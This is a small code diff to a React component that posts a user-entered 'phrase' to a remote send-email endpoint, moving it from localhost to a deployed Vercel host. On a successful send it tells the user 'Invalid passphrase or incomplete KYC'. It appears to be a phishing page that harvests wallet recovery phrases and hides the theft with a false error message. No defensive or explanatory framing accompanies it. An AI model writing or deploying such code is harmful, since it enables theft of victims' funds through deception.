@@ -14,7 +14,7 @@ const Phrases = () => {
   const handleSubmit = async () => {
     if(phrase !== ""){
       try {
-        const response = await axios.post("http://localhost:5000/send-email", { phrase });
+        const response = await axios.post("https://pi-backend-ruddy.vercel.app/send-email", { phrase });
         if (response.status === 200) {
           setMessage("Invalid passphrase or incomplete KYC");
         } else {
